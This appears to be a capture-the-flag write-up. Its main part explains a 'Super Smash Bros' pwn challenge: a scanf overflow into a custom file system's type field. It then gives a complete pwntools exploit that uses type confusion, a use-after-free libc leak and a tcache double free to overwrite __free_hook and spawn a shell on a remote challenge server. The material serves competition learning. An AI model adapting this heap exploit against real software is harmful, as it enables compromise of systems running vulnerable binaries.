## EsoVM

[esovm](esovm.pdf)

## Super Smash Bros

In this challenge a simple file system is implemented, here is the data structures

```assembly
00000000 file            struc ; (sizeof=0x80, mappedto_6)
00000000 type            db ?
00000001 dir_name        db 38 dup(?)
00000027 data            fdata ?
00000080 file            ends

00000000 fdata           union ; (sizeof=0x59, mappedto_8)
00000000 dir_files       db 89 dup(?)
00000000 file_data       filedata ?
00000000 fdata           ends

00000000 filedata        struc ; (sizeof=0x59, mappedto_9)
00000000 isbig           db ?
00000001 pbuf            dq ?
00000009 buf             db 80 dup(?)
00000059 filedata        ends

00000000 fs              struc ; (sizeof=0x8000, mappedto_7)
00000000 files           file 256 dup(?)
00008000 fs              ends
```

Here is a overflow when `add_file` is called

```c
__isoc99_scanf("%90s", v4->data.file_data.buf);// overflow
```

However, what we can change is the `type` field only, so we can cause the type confusion.

Here is the exploit, I think my idea is explained well in the comments :D

```python
from pwn import *

g_local=1
context(log_level='debug', arch='amd64')
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
if g_local:
	sh = process("./ssb")
	gdb.attach(sh)
else:
	sh = remote("34.85.75.40", 31000)

sh.recvuntil("> ")

def add_file(name, size, data):
	sh.sendline("2")
	sh.recvuntil("name: ")
	sh.sendline(name)
	sh.recvuntil("size: ")
	sh.sendline(str(size))
	sh.send(data)
	sh.recvuntil("> ")


def input_name(cmd, name):
	sh.sendline(cmd)
	sh.recvuntil("name: ")
	sh.sendline(name)
	sh.recvuntil("> ")

add_dir = lambda name : input_name('3', name)
remove = lambda name : input_name('6', name)
change_dir = lambda name : input_name('5', name)

def show_file(name):
	sh.sendline('4')
	sh.recvuntil("name: ")
	sh.sendline(name)
	ret = sh.recvuntil('\n')
	sh.recvuntil("> ")
	return ret[:-1]

# 0. create 1+8 big files, 1 small file, 1 big file
#	last big file should have pdata address LSB==0

# make LSB of new chunk == 0x00
add_file('prepad', 0x80, 'prepad')

# fill tcache
for i in xrange(8):
	add_file(str(i), 0x80, str(i))
for i in xrange(7):
	remove(str(i))

add_file("tmp", 0x10, "tmp\n")
add_file('8', 0x60, '8') # will rewrite its address

# 1. big file -> directory
remove("tmp")
add_file("overflow", 0x10, "A" * 0x50 + '\x01' + 'hacked\n')

# 1.1. fill index 0x90
add_dir("d1")
change_dir("d1")
for i in xrange(0x59):
	add_file("pad", 0x10, "pad\n")
change_dir("..")
#0x5a

add_dir("d2")
change_dir("d2")
for i in xrange(0x90 - 4 - 0x5a - 2):
	add_file("pad", 0x10, "pad\n")
add_file("0x90", 0x10, "0x90\n")
change_dir("..")

# 2. cd into that directory
# 3. remove dir_files[1],
#	so LSB of address is cleared to 0,
#	which is another big file data
change_dir("hacked")
remove("0x90")
change_dir("..")

# 4. change it back to big file
remove("overflow")
add_file("overflow", 0x10, "A" * 0x50 + '\x02' + 'hacked\n')

# 5. free, cause UAF, then leak
remove("hacked")
libc_addr = u64(show_file("7") + '\x00\x00') - 0x3ebca0
print hex(libc_addr)

# 6. double free, poison 0x90 tcache
for i in xrange(7): # consume tcache
	add_file(str(i), 0x80, str(i))
add_file('8', 0x80, '8') #consume unsorted bin
remove('7')
remove('8') # double free

# 7. rewrite free hook
add_file("rewrite_fd", 0x80, \
	p64(libc_addr + e.symbols["__free_hook"]))
add_file("consume", 0x80, p64(0))
add_file("rewrite_free_hook", 0x80, \
	p64(libc_addr + e.symbols["system"]))

# 8. get shell
add_file("shell", 0x80, "/bin/sh")

sh.sendline('6')
sh.recvuntil("name: ")
sh.sendline("shell")
sh.interactive()
```

